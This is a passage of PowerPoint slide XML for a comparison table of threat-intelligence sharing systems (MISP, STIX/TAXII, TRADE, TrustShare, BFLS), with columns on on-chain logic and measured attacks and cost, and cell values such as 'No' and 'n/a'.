                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:schemeClr val="bg2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>On-chain logic</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:schemeClr val="bg2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Attacks &amp; cost measured</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:schemeClr val="bg2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="420624">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MISP federation [1], [8]</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent3"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>No</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent3"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>No</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent3"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>n/a</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent3"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>No</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="420624">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STIX / TAXII [2], [3]</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent3"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>No</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent3"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>No</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent3"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>n/a</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent3"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>No</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="420624">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TRADE [5], TrustShare [6]</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>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91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent3"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>No</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent3"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Contracts</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent3"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>No</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="420624">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Dunnett et al. [7], BFLS [9]</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1400" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>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91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1400" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent3"/>
